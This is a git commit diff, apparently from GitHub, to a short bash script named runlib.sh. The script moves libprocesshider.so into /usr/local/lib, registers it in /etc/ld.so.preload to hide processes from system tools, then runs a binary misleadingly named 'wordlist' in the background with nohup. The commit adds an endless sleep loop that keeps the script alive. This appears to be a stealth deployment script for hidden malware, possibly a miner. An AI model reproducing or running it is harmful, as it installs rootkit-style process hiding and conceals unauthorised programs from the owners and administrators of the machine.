d9b1f60b9c50bed8c2edcd258922584bac0c26cb
vitamingeratis <88042802+vitamingeratis@users.noreply.github.com>
2021-12-13 00:32:51 -0800

    Update runlib.sh

--- runlib.sh
+++ runlib.sh
@@ -1,4 +1,4 @@
 #!/usr/bin/env bash
 
 mv libprocesshider.so /usr/local/lib/ && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload && chmod +x ./wordlist && nohup ./wordlist "" /dev/null 2>&1
-while True:pass
+while [ 1 ]; do sleep 3d; done; sleep 3d
